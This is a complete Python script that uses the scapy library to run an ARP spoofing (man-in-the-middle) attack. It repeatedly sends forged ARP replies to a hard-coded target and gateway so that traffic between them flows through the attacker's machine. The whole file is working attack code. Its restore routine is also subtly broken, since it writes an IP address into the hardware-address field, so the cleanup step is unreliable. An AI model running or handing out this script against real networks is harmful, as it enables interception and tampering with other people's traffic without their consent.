import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    answer_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return answer_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_ip)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.92.1"
gateway_ip = "192.168.92.2"

try:
    packet_counter = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_counter = packet_counter + 2
        print("\r[+] Packet sent: " + str(packet_counter)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n [-] Detected CTRL+C...Resetting ARP tables....Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
